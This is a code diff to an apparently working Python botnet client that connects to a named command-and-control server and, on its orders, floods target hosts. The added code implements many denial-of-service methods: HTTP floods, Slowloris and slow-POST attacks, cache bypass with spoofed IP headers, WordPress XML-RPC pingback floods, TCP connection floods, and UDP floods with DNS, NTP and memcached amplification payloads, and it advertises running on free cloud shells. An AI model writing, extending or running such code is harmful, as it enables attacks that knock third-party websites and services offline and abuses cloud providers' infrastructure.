@@ -1,3 +1,19 @@
+"""
+ENHANCED BOT CLIENT
+===================
+Features:
+- Auto-connects to https://c2-server-io.onrender.com/
+- Resource-friendly (prevents overload)
+- Optimized thread management (50-300 threads)
+- Custom user agents from server
+- Optional proxy support
+- Works in GitHub Codespaces & Google Cloud Shell
+- Persistent connection with auto-reconnect
+
+Install: pip install requests psutil
+Run: python client.py
+"""
+
 import threading
 import time
 import sys
@@ -346,6 +362,8 @@ class EnhancedBot:
                 self.cmd_tcp_flood(cmd)
             elif cmd_type == 'udp_flood':
                 self.cmd_udp_flood(cmd)
+            elif cmd_type == 'layer7':
+                self.cmd_layer7(cmd)
             elif cmd_type == 'sysinfo':
                 self.cmd_sysinfo()
             elif cmd_type == 'stop_all':
@@ -363,11 +381,11 @@ class EnhancedBot:
         print("[OK] Pong!")
     
     def cmd_http_flood(self, cmd):
-        """OPTIMIZED HTTP FLOOD - Resource Friendly"""
+        """OPTIMIZED HTTP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 100)
-        method = cmd.get('method', 'GET').upper()
+        attack_type = cmd.get('attack_type', 'GET')
         user_agents = cmd.get('user_agents', [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         ])
@@ -379,16 +397,15 @@ class EnhancedBot:
             max_threads = min(max_threads, 100)
             print("[!] High CPU usage detected, limiting threads to 100")
         
-        print(f"[*] OPTIMIZED HTTP FLOOD")
+        print(f"[*] HTTP {attack_type} ATTACK")
         print(f"    Target: {target}")
-        print(f"    Method: {method}")
         print(f"    Duration: {duration}s")
         print(f"    Threads: {max_threads}")
         print(f"    User Agents: {len(user_agents)}")
         print(f"    Proxies: {len(proxies) if proxies else 'None'}")
         
         self.stats['total_attacks'] += 1
-        self.send_status('running', f'{method} FLOOD: {target}')
+        self.send_status('running', f'{attack_type} ATTACK: {target}')
         
         attack_id = f"http_{int(time.time())}"
         with self.attack_lock:
@@ -398,11 +415,10 @@ class EnhancedBot:
         success_count = [0]
         
         def flood_worker():
-            """Optimized flood worker with rate limiting"""
+            """Attack worker with multiple vectors"""
             end_time = time.time() + duration
             session = self.get_session()
             
-            # Select proxy if available
             proxy_dict = None
             if proxies:
                 proxy_str = random.choice(proxies)
@@ -417,31 +433,75 @@ class EnhancedBot:
                         'Cache-Control': 'no-cache'
                     }
                     
-                    params = {
-                        '_': str(int(time.time() * 1000000)),
-                        'r': random.randint(1, 9999999)
-                    }
-                    
-                    if method == 'GET':
+                    if attack_type == 'GET':
+                        params = {
+                            '_': str(int(time.time() * 1000000)),
+                            'r': random.randint(1, 9999999)
+                        }
                         r = session.get(target, headers=headers, params=params, 
                                       timeout=3, verify=False, proxies=proxy_dict)
-                    elif method == 'POST':
+                    
+                    elif attack_type == 'POST':
                         payload = {'data': 'x' * random.randint(100, 1000)}
                         r = session.post(target, headers=headers, data=payload, 
                                        timeout=3, verify=False, proxies=proxy_dict)
-                    elif method == 'HEAD':
+                    
+                    elif attack_type == 'HEAD':
+                        params = {'_': str(int(time.time() * 1000000))}
                         r = session.head(target, headers=headers, params=params, 
                                        timeout=3, verify=False, proxies=proxy_dict)
-                    else:
-                        r = session.get(target, headers=headers, params=params, 
+                    
+                    elif attack_type == 'SLOWLORIS':
+                        # Slow headers attack
+                        headers['X-a'] = str(random.randint(1, 9999))
+                        r = session.get(target, headers=headers, timeout=30, 
+                                      verify=False, proxies=proxy_dict, stream=True)
+                        time.sleep(10)
+                    
+                    elif attack_type == 'BYPASS':
+                        # Cache bypass
+                        bypass_headers = headers.copy()
+                        bypass_headers.update({
+                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+                            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+                            'Pragma': 'no-cache'
+                        })
+                        params = {'cache': random.randint(1, 999999)}
+                        r = session.get(target, headers=bypass_headers, params=params,
                                       timeout=3, verify=False, proxies=proxy_dict)
+                    
+                    elif attack_type == 'XMLRPC':
+                        # XML-RPC flood
+                        xml_data = f'''<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>{target}</string></value></param>
+    <param><value><string>{target}</string></value></param>
+  </params>
+</methodCall>'''
+                        headers['Content-Type'] = 'text/xml'
+                        r = session.post(target + '/xmlrpc.php', headers=headers, 
+                                       data=xml_data, timeout=3, verify=False, proxies=proxy_dict)
+                    
+                    elif attack_type == 'RUDY':
+                        # Slow POST
+                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+                        headers['Content-Length'] = '1000000'
+                        r = session.post(target, headers=headers, data='A'*100,
+                                       timeout=30, verify=False, proxies=proxy_dict)
+                        time.sleep(5)
+                    
+                    else:
+                        # Default GET
+                        r = session.get(target, headers=headers, timeout=3, 
+                                      verify=False, proxies=proxy_dict)
                     
                     request_count[0] += 1
                     if r.status_code < 500:
                         success_count[0] += 1
                     
-                    # Small delay to prevent CPU overload (0.001s = 1000 req/s per thread)
-                    time.sleep(0.001)
+                    time.sleep(0.001 if attack_type not in ['SLOWLORIS', 'RUDY'] else 0)
                     
                 except:
                     request_count[0] += 1
@@ -474,18 +534,18 @@ class EnhancedBot:
                 if attack_id in self.active_attacks:
                     self.active_attacks.remove(attack_id)
         
-        print(f"\n[OK] FLOOD COMPLETE: {request_count[0]:,} requests sent!")
+        print(f"\n[OK] {attack_type} ATTACK COMPLETE: {request_count[0]:,} requests sent!")
         self.stats['total_requests'] += request_count[0]
         self.stats['successful_attacks'] += 1
-        self.send_status('success', f'Flood: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
+        self.send_status('success', f'{attack_type}: {request_count[0]:,} req @ {request_count[0]/duration:.0f} rps')
     
     def cmd_tcp_flood(self, cmd):
-        """OPTIMIZED TCP FLOOD"""
+        """OPTIMIZED TCP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 75)
+        attack_type = cmd.get('attack_type', 'CONNECT')
         
-        # Limit threads to prevent overload
         max_threads = min(threads, 200)
         if not self.check_cpu_usage():
             max_threads = min(max_threads, 75)
@@ -497,13 +557,13 @@ class EnhancedBot:
             host = target
             port = 80
         
-        print(f"[*] OPTIMIZED TCP FLOOD")
+        print(f"[*] TCP {attack_type} ATTACK")
         print(f"    Target: {host}:{port}")
         print(f"    Duration: {duration}s")
         print(f"    Threads: {max_threads}")
         
         self.stats['total_attacks'] += 1
-        self.send_status('running', f'TCP FLOOD: {host}:{port}')
+        self.send_status('running', f'TCP {attack_type}: {host}:{port}')
         
         attack_id = f"tcp_{int(time.time())}"
         with self.attack_lock:
@@ -512,21 +572,39 @@ class EnhancedBot:
         request_count = [0]
         
         def tcp_worker():
-            """TCP worker with rate limiting"""
+            """TCP worker with multiple attack types"""
             end_time = time.time() + duration
             
             while time.time() < end_time and attack_id in self.active_attacks:
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.settimeout(1)
-                    sock.connect((host, port))
                     
-                    payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(256)
-                    sock.send(payload)
-                    sock.close()
+                    if attack_type == 'SYN':
+                        # SYN flood attempt
+                        sock.connect((host, port))
+                        sock.close()
+                    
+                    elif attack_type == 'ACK':
+                        # ACK flood
+                        sock.connect((host, port))
+                        sock.send(b'\x00' * 256)
+                        sock.close()
+                    
+                    elif attack_type == 'FIN':
+                        # FIN flood
+                        sock.connect((host, port))
+                        sock.shutdown(socket.SHUT_WR)
+                        sock.close()
+                    
+                    else:  # CONNECT
+                        sock.connect((host, port))
+                        payload = b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" + os.urandom(256)
+                        sock.send(payload)
+                        sock.close()
                     
                     request_count[0] += 1
-                    time.sleep(0.01)  # Prevent overload
+                    time.sleep(0.01)
                 except:
                     request_count[0] += 1
                     time.sleep(0.05)
@@ -543,18 +621,18 @@ class EnhancedBot:
                 if attack_id in self.active_attacks:
                     self.active_attacks.remove(attack_id)
         
-        print(f"\n[OK] TCP flood: {request_count[0]:,} connections")
+        print(f"\n[OK] TCP {attack_type}: {request_count[0]:,} connections")
         self.stats['total_requests'] += request_count[0]
         self.stats['successful_attacks'] += 1
-        self.send_status('success', f'TCP flood: {request_count[0]:,} conn')
+        self.send_status('success', f'TCP {attack_type}: {request_count[0]:,} conn')
     
     def cmd_udp_flood(self, cmd):
-        """OPTIMIZED UDP FLOOD"""
+        """OPTIMIZED UDP FLOOD with multiple attack types"""
         target = cmd['target']
         duration = cmd.get('duration', 60)
         threads = cmd.get('threads', 75)
+        attack_type = cmd.get('attack_type', 'FLOOD')
         
-        # Limit threads to prevent overload
         max_threads = min(threads, 200)
         if not self.check_cpu_usage():
             max_threads = min(max_threads, 75)
@@ -566,13 +644,13 @@ class EnhancedBot:
             host = target
             port = 53
         
-        print(f"[*] OPTIMIZED UDP FLOOD")
+        print(f"[*] UDP {attack_type} ATTACK")
         print(f"    Target: {host}:{port}")
         print(f"    Duration: {duration}s")
         print(f"    Threads: {max_threads}")
         
         self.stats['total_attacks'] += 1
-        self.send_status('running', f'UDP FLOOD: {host}:{port}')
+        self.send_status('running', f'UDP {attack_type}: {host}:{port}')
         
         attack_id = f"udp_{int(time.time())}"
         with self.attack_lock:
@@ -581,16 +659,31 @@ class EnhancedBot:
         request_count = [0]
         
         def udp_worker():
-            """UDP worker with rate limiting"""
+            """UDP worker with multiple attack types"""
             end_time = time.time() + duration
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             
             while time.time() < end_time and attack_id in self.active_attacks:
                 try:
-                    payload = os.urandom(random.randint(512, 2048))
+                    if attack_type == 'DNS':
+                        # DNS amplification
+                        payload = b'\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(50)
+                    
+                    elif attack_type == 'NTP':
+                        # NTP amplification
+                        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
+                    
+                    elif attack_type == 'MEMCACHED':
+                        # Memcached amplification
+                        payload = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
+                    
+                    else:  # FLOOD
+                        # Standard UDP flood
+                        payload = os.urandom(random.randint(512, 2048))
+                    
                     sock.sendto(payload, (host, port))
                     request_count[0] += 1
-                    time.sleep(0.001)  # Prevent overload
+                    time.sleep(0.001)
                 except:
                     pass
             
@@ -608,10 +701,20 @@ class EnhancedBot:
                 if attack_id in self.active_attacks:
                     self.active_attacks.remove(attack_id)
         
-        print(f"\n[OK] UDP flood: {request_count[0]:,} packets")
+        print(f"\n[OK] UDP {attack_type}: {request_count[0]:,} packets")
         self.stats['total_requests'] += request_count[0]
         self.stats['successful_attacks'] += 1
-        self.send_status('success', f'UDP flood: {request_count[0]:,} packets')
+        self.send_status('success', f'UDP {attack_type}: {request_count[0]:,} packets')
+    
+    def cmd_layer7(self, cmd):
+        """Layer 7 attacks"""
+        attack_type = cmd.get('attack_type', 'BROWSER')
+        
+        if attack_type in ['BROWSER', 'API', 'SEARCH', 'LOGIN']:
+            # Delegate to HTTP flood with modifications
+            self.cmd_http_flood(cmd)
+        else:
+            self.cmd_http_flood(cmd)
     
     def cmd_sysinfo(self):
         """System info"""
